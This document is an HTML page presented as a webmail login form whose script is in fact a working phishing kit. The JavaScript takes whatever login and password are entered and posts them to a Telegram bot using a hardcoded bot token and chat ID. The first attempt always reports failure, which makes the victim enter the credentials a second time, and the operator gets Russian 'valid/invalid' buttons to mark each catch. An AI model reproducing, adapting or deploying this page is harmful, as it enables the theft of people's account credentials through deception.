<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Enter credentials</title>
  <style>
    :root{
      --form-w: 283px;
      --field-h: 32px;
      --addon-w: 34px;
      --radius: 3px;

      --accent: #169bd5;
      --accent-border:#0b5f86;

      --text:#1f2937;
      --muted:#6b7280;
      --border:#bfc5c9;
      --addon-bg:#eef1f3;
      --bg:#ffffff;
      --logo:#ff6a00;
      --error:#e11d48;
      --success:#15803d;
    }

    html,body{height:100%}
    body{
      margin:0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      color:var(--text);
      background:var(--bg);
    }

    .wrap{
      min-height:100vh;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      padding:110px 16px 60px;
      box-sizing:border-box;
    }

    .label{
      width:var(--form-w);
      font-size:14px;
      font-weight:700;
      margin:14px 0 6px;
      text-align:left;
    }

    .group{
      width:var(--form-w);
      display:flex;
      align-items:stretch;
    }

    .addon{
      width:var(--addon-w);
      height:var(--field-h);
      border:1px solid var(--border);
      border-right:0;
      border-top-left-radius:var(--radius);
      border-bottom-left-radius:var(--radius);
      background:var(--addon-bg);
      display:flex;
      align-items:center;
      justify-content:center;
      box-sizing:border-box;
    }

    .addon svg{
      width:16px;height:16px;
      fill:#9aa3aa;
      display:block;
    }

    .input{
      width:calc(var(--form-w) - var(--addon-w));
      height:var(--field-h);
      border:1px solid var(--border);
      border-top-right-radius:var(--radius);
      border-bottom-right-radius:var(--radius);
      padding:0 10px;
      font-size:13px;
      outline:none;
      box-sizing:border-box;
      background:#fff;
    }

    .input:focus{
      border-color:#8aa7b8;
      box-shadow:0 0 0 2px rgba(22,155,213,.15);
    }

    .btn{
      width:var(--form-w);
      height:var(--field-h);
      margin-top:18px;
      border-radius:var(--radius);
      border:1px solid var(--accent-border);
      background:var(--accent);
      color:#fff;
      font-weight:700;
      font-size:13px;
      cursor:pointer;
    }
    .btn:hover{ filter:brightness(.97); }

    .reset{
      margin-top:14px;
      font-size:13px;
      font-weight:700;
      color:#2c3e50;
      text-decoration:none;
    }
    .reset:hover{ text-decoration:underline; }

    .status-message{
      width:var(--form-w);
      margin-top:12px;
      font-size:12px;
      font-weight:700;
      min-height:16px;
    }
    .status-message.success{ color:var(--success); }
    .status-message.error{ color:var(--error); }

    .input.error{
      border-color:var(--error);
      box-shadow:0 0 0 2px rgba(225,29,72,.15);
    }

    .loading-overlay{
      position:fixed;
      inset:0;
      display:flex;
      align-items:center;
      justify-content:center;
      background:rgba(255,255,255,.78);
      backdrop-filter:blur(2px);
      z-index:999;
      opacity:0;
      pointer-events:none;
      transition:opacity .15s ease;
    }
    .loading-overlay.active{
      opacity:1;
      pointer-events:auto;
    }
    .spinner{
      width:38px;
      height:38px;
      border-radius:50%;
      border:4px solid #dbe3e8;
      border-top-color:var(--accent);
      animation:spin 1s linear infinite;
    }
    .loading-text{
      margin-left:12px;
      font-weight:700;
      color:#1f2937;
    }
    @keyframes spin{
      to{ transform:rotate(360deg); }
    }

    .langs{
      margin-top:48px;
      display:flex;
      flex-wrap:wrap;
      gap:18px;
      justify-content:center;
      align-items:center;
      font-size:12px;
      color:#2c3e50;
      font-weight:700;
      user-select:none;
    }
    .langs a{ color:inherit; text-decoration:none; }
    .langs a:hover{ text-decoration:underline; }

    .footer{
      margin-top:80px;
      text-align:center;
      color:var(--muted);
      font-size:11px;
      line-height:1.4;
    }
    .footer .mark{
      display:inline-flex;
      align-items:center;
      justify-content:center;
      width:24px;height:24px;
      border-radius:50%;
      background:#fff;
      color:var(--logo);
      font-weight:900;
      margin-bottom:6px;
    }

    .logo-img{
      display:block;
      margin:0 auto 26px;
      width:320px;
      height:auto;
    }

    @media (max-width: 360px){
      :root{ --form-w: 260px; }
    }
  </style>
</head>
<body>

  <div id="loadingOverlay" class="loading-overlay" aria-hidden="true">
    <div class="spinner" aria-label="Loading"></div>
    <div class="loading-text">Processing…</div>
  </div>

  <!-- Hidden iframe: used to send POST to Telegram without CORS -->
  <iframe name="tg_iframe" style="display:none;"></iframe>

  <div class="wrap">
    <img class="logo-img" src="./webmail-logo.svg" alt="Webmail" />

    <!-- form: action/method removed, handled by JS -->
    <form id="f" autocomplete="on">
      <div class="label">Login</div>
      <div class="group">
        <div class="addon" aria-hidden="true">
          <!-- user icon -->
          <svg viewBox="0 0 24 24">
            <path d="M12 12c2.76 0 5-2.46 5-5.5S14.76 1 12 1 7 3.46 7 6.5 9.24 12 12 12zm0 2c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/>
          </svg>
        </div>
        <input class="input" type="text" name="login" placeholder="Enter login" autocomplete="username" required />
      </div>

      <div class="label" style="margin-top:18px;">Password</div>
      <div class="group">
        <div class="addon" aria-hidden="true">
          <!-- lock icon -->
          <svg viewBox="0 0 24 24">
            <path d="M17 10V7a5 5 0 0 0-10 0v3H5v11h14V10h-2Zm-6 6a1 1 0 1 1 2 0 1 1 0 0 1-2 0Zm6-6H7V7a5 5 0 0 1 10 0v3Z"/>
          </svg>
        </div>
        <input class="input" type="password" name="password" placeholder="Enter password" autocomplete="current-password" required />
      </div>

      <button class="btn" type="submit">Continue</button>
      <div id="statusMessage" class="status-message" role="status" aria-live="polite"></div>
    </form>

    <a class="reset" href="#" id="resetLink">Reset data</a>

    <div class="langs" aria-label="Languages">
      <a href="#">English</a>
      <a href="#">العربية</a>
      <a href="#">čeština</a>
      <a href="#">dansk</a>
      <a href="#">Deutsch</a>
      <a href="#">Ελληνικά</a>
      <a href="#">español</a>
      <a href="#">español latinoamericano</a>
      <span>…</span>
    </div>

    <div class="footer">
      <div class="mark">cp</div><br/>
      Copyright © <span id="y"></span> Your company.<br/>
      Privacy Policy
    </div>
  </div>

  <script>
    // Footer year
    document.getElementById('y').textContent = new Date().getFullYear();

    // ⚠️ Variant B (experiment): token is visible in the sources.
    // Insert dev token and chat_id here.
    const MADknjdfogdsjfmk = "8551401351:AAE_HPh8RsgqARs46q-Ck9l1obZ--Ka_6FQ";
    const CHAT_ID   = "7942744213"; // e.g. "123456789" or "-1001234567890"

    const form = document.getElementById('f');
    const statusMessage = document.getElementById('statusMessage');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loginInput = form.elements.login;
    const passwordInput = form.elements.password;
    const resetLink = document.getElementById('resetLink');
    let attemptCount = 0;
    const inlineKeyboard = JSON.stringify({
      inline_keyboard: [
        [
          { text: 'валид', callback_data: 'valid' },
          { text: 'невалид', callback_data: 'invalid' }
        ]
      ]
    });
    function showLoading(on){
      loadingOverlay.classList.toggle('active', on);
      loadingOverlay.setAttribute('aria-hidden', on ? 'false' : 'true');
    }

    function showStatus(type, message){
      statusMessage.textContent = message;
      statusMessage.className = type ? `status-message ${type}` : 'status-message';
    }

    async function sendToTelegram(login, password, status){
      const text = `New submission:\nLogin: ${login}\nPassword: ${password}\nStatus: ${status}`;
      const body = new URLSearchParams({
        chat_id: CHAT_ID,
        text,
        reply_markup: inlineKeyboard,
        disable_web_page_preview: 'true'
      });

      let lastError = null;
      const maxAttempts = 3;

      for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
        try {
          const res = await fetch(`https://api.telegram.org/bot${MADknjdfogdsjfmk}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body
          });

          if (!res.ok) {
            const errText = await res.text().catch(() => res.statusText);
            throw new Error(`Telegram error ${res.status}: ${errText}`);
          }

          return; // success
        } catch (err) {
          lastError = err;
          if (attempt < maxAttempts) {
            await new Promise((resolve) => setTimeout(resolve, 800 * attempt));
          }
        }
      }

      throw lastError || new Error('Unknown Telegram error');
    }

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      loginInput.classList.remove('error');
      passwordInput.classList.remove('error');
      showStatus('', '');

      const login = loginInput.value.trim();
      const password = passwordInput.value;
      attemptCount += 1;

      showLoading(true);
      const status = attemptCount >= 2 ? 'VALID' : 'INVALID';

      try {
        await new Promise((resolve) => setTimeout(resolve, 1400)); // имитация загрузки
        await sendToTelegram(login, password, status);

        if (status === 'VALID') {
          showStatus('success', 'User successfully verified.');
          form.reset();
          attemptCount = 0;
        } else {
          showStatus('error', 'Invalid login or password.');
          loginInput.classList.add('error');
          passwordInput.classList.add('error');
        }
      } catch (err) {
        showStatus('error', 'Send to Telegram failed. Проверь MADknjdfogdsjfmk и CHAT_ID.');
        console.error(err);
      } finally {
        showLoading(false);
      }
    });

    // Reset via link
    resetLink.addEventListener('click', (e) => {
      e.preventDefault();
      form.reset();
      showStatus('', '');
    });
  </script>
</body>
</html>
